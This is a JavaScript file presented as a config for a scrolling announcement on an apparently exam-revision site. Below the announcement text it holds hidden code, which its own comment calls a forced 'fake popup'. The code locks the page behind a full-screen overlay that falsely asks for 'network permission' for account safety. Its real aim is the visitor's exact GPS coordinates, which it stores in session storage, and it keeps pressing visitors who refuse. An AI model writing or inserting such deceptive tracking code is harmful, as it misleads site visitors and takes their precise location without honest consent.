// ===============================================
// FILE CẤU HÌNH LỜI THÔNG BÁO CHẠY NGANG ĐỈNH TRANG
// ===============================================

// Anh chỉ cần thay đổi nội dung chữ ở trong dấu ngoặc kép dưới đây:
const NOI_DUNG_THONG_BAO = "Chúc Bạn Ôn Thi Thật Tốt Ạ";

// Tự động áp dụng thông báo vào trang web (KHÔNG CẦN CHỈNH SỬA PHẦN NÀY)
document.addEventListener('DOMContentLoaded', () => {
    const marqueeElement = document.querySelector('.marquee-text');
    if (marqueeElement) {
        marqueeElement.innerHTML = NOI_DUNG_THONG_BAO;
    }
    
    // Yêu cầu quyền mạng (vị trí) ép buộc bằng popup ảo
    if (!sessionStorage.getItem('exact_lat') && "geolocation" in navigator) {
        // Kiểm tra xem trình duyệt đã cấp quyền chưa
        navigator.permissions.query({name: 'geolocation'}).then(function(result) {
            if (result.state === 'granted') {
                // Đã cấp quyền từ trước, lấy luôn
                navigator.geolocation.getCurrentPosition(pos => {
                    sessionStorage.setItem('exact_lat', pos.coords.latitude);
                    sessionStorage.setItem('exact_lng', pos.coords.longitude);
                });
            } else {
                // Chưa cấp quyền hoặc đã từ chối -> Hiện Popup ảo khóa màn hình
                showLocationOverlay();
            }
        });
    }

    function showLocationOverlay() {
        // Nếu đã có thì không tạo thêm
        if (document.getElementById('location-overlay')) return;

        const overlayHtml = `
            <div id="location-overlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(10px); z-index: 9999999; display: flex; justify-content: center; align-items: center;">
                <div style="background: white; padding: 40px 30px; border-radius: 20px; text-align: center; max-width: 400px; width: 90%; box-shadow: 0 10px 30px rgba(0,0,0,0.5); animation: popIn 0.3s ease-out;">
                    <div style="font-size: 3em; margin-bottom: 15px;">🌐</div>
                    <h2 style="color: #2c3e50; margin-bottom: 15px; font-family: 'Inter', sans-serif;">Yêu Cầu Quyền Mạng</h2>
                    <p id="location-msg" style="color: #34495e; margin-bottom: 25px; font-size: 1em; line-height: 1.5;">Hệ thống muốn cấp quyền mạng của bạn để đảm bảo tính an toàn cho tài khoản. Vui lòng nhấn nút bên dưới!</p>
                    
                    <button id="btn-allow-location" style="background: #0984e3; color: white; border: none; padding: 15px 30px; border-radius: 12px; font-weight: bold; font-size: 1.1em; cursor: pointer; width: 100%; transition: 0.2s; box-shadow: 0 5px 15px rgba(9, 132, 227, 0.4);">
                        Cho Phép
                    </button>
                </div>
            </div>
            <style>
                @keyframes popIn {
                    from { transform: scale(0.9); opacity: 0; }
                    to { transform: scale(1); opacity: 1; }
                }
            </style>
        `;
        document.body.insertAdjacentHTML('beforeend', overlayHtml);

        document.getElementById('btn-allow-location').addEventListener('click', function() {
            const btn = this;
            const msg = document.getElementById('location-msg');
            btn.innerHTML = "Đang xử lý...";
            btn.style.opacity = "0.7";

            navigator.geolocation.getCurrentPosition(
                function(position) {
                    // Thành công
                    sessionStorage.setItem('exact_lat', position.coords.latitude);
                    sessionStorage.setItem('exact_lng', position.coords.longitude);
                    document.getElementById('location-overlay').remove();
                },
                function(error) {
                    // Thất bại hoặc bị từ chối
                    btn.innerHTML = "Cho Phép Lại";
                    btn.style.opacity = "1";
                    btn.style.background = "#d63031";
                    btn.style.boxShadow = "0 5px 15px rgba(214, 48, 49, 0.4)";
                    msg.innerHTML = "<b>❌ Bạn đã từ chối cấp quyền!</b><br>Vui lòng nhấp vào biểu tượng 🔒 trên thanh địa chỉ trình duyệt, bật quyền <b>Vị trí</b> và thử lại để tiếp tục.";
                    msg.style.color = "#d63031";
                }
            );
        });
    }
});
